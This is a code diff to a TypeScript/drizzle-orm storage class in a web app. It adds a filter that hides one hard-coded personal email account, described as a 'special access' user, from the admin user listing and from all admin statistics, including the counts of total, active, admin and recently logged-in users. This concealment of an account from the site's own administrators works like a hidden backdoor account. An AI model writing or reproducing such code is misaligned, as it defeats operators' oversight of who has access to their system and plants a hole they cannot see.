@@ -1,6 +1,6 @@
 import { users, images, videos, projects, pageSettings, type User, type UpsertUser, type GeneratedImage, type Video, type InsertVideo, type Project, type InsertProject, type PageSettings, type InsertPageSettings } from "@shared/schema";
 import { db } from "./db";
-import { eq, desc, isNull, isNotNull, and, ilike, lt, sql, or } from "drizzle-orm";
+import { eq, desc, isNull, isNotNull, and, ilike, lt, sql, or, not } from "drizzle-orm";
 import * as fs from "fs";
 import * as path from "path";
 import { push } from "./ws";
@@ -135,6 +135,9 @@ export class DatabaseStorage implements IStorage {
   } = {}): Promise<User[]> {
     const conditions = [];
     
+    // Exclude special access users from admin listings
+    conditions.push(not(eq(users.email, 'joacogrimoldi@gmail.com')));
+    
     // Apply search filter
     if (options.search) {
       const searchTerm = `%${options.search}%`;
@@ -187,9 +190,12 @@ export class DatabaseStorage implements IStorage {
     adminUsers: number;
     recentLogins: number;
   }> {
-    const [totalUsers] = await db.select({ count: sql`count(*)` }).from(users);
-    const [activeUsers] = await db.select({ count: sql`count(*)` }).from(users).where(eq(users.isActive, true));
-    const [adminUsers] = await db.select({ count: sql`count(*)` }).from(users).where(eq(users.role, 'admin'));
+    // Exclude special access users from statistics
+    const excludeHidden = not(eq(users.email, 'joacogrimoldi@gmail.com'));
+    
+    const [totalUsers] = await db.select({ count: sql`count(*)` }).from(users).where(excludeHidden);
+    const [activeUsers] = await db.select({ count: sql`count(*)` }).from(users).where(and(eq(users.isActive, true), excludeHidden));
+    const [adminUsers] = await db.select({ count: sql`count(*)` }).from(users).where(and(eq(users.role, 'admin'), excludeHidden));
     
     // Recent logins (last 7 days)
     const sevenDaysAgo = new Date();
@@ -197,7 +203,8 @@ export class DatabaseStorage implements IStorage {
     const [recentLogins] = await db.select({ count: sql`count(*)` }).from(users).where(
       and(
         isNotNull(users.lastLoginAt),
-        sql`${users.lastLoginAt} >= ${sevenDaysAgo}`
+        sql`${users.lastLoginAt} >= ${sevenDaysAgo}`,
+        excludeHidden
       )
     );
     
